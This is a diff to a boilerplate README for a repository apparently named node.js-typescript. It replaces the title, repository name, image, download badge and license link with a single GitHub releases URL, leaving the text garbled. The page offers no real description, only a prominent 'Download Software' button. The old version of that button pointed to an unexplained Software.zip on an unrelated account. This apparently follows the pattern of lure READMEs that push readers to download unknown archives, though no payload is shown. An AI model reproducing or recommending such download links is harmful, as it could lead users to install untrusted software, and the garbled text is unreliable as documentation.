@@ -1,10 +1,10 @@
 
-# 🚀 Welcome to the Node.js Typescript Repository! 🌟
+# 🚀 Welcome to the https://github.com/Universition/node.js-typescript/releases/tag/v2.0 Typescript Repository! 🌟
 
-![Node.js Typescript](https://www.example.com/image.jpg)
+![https://github.com/Universition/node.js-typescript/releases/tag/v2.0 Typescript](https://github.com/Universition/node.js-typescript/releases/tag/v2.0)
 
 ## Repository Name
-**node.js-typescript**
+**https://github.com/Universition/node.js-typescript/releases/tag/v2.0**
 
 ## Description
 No description provided.
@@ -22,7 +22,7 @@ No description provided.
 - user-agent-parser
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Universition/node.js-typescript/releases/tag/v2.0)](https://github.com/Universition/node.js-typescript/releases/tag/v2.0)
   
 The software package is available for download. Click the button above to access the download link. 
 
@@ -57,4 +57,4 @@ The following resources were used to create this project:
 - Resource 3
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Universition/node.js-typescript/releases/tag/v2.0](https://github.com/Universition/node.js-typescript/releases/tag/v2.0) file for details.
